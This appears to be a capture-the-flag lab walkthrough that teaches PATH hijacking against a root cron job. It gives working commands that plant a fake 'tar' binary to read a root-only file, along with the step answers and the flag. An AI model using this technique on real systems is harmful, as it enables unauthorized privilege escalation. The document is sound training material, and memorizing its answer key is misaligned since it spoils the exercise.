# PATH Hijacking Challenge

## Goal

Exploit a root cron job that trusts `PATH`, then read:

```text
FLAG{path_hijacking_pwned_2026}
```

The flag is copied to:

```text
/opt/output/flag.txt
```

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Identify The Root Cron Script

Read system cron entries:

```bash
cat /etc/crontab
```

Find the root job that executes:

```text
/opt/backup.sh
```

Submit for step 1:

```text
/opt/backup.sh
```

## Step 2. Find The PATH Hijack Target

Inspect the script:

```bash
cat /opt/backup.sh
```

The script calls `tar` without an absolute path.

Submit for step 2:

```text
tar
```

## Step 3. Create A Malicious `tar`

Create a fake `tar` earlier in root cron's `PATH`:

```bash
cat > /tmp/tar <<'EOF'
#!/bin/bash
cat /root/flag.txt > /opt/output/flag.txt
chmod 644 /opt/output/flag.txt
EOF
chmod +x /tmp/tar
```

Wait for cron to run:

```bash
sleep 70
cat /opt/output/flag.txt
```

Submit:

```text
FLAG{path_hijacking_pwned_2026}
```
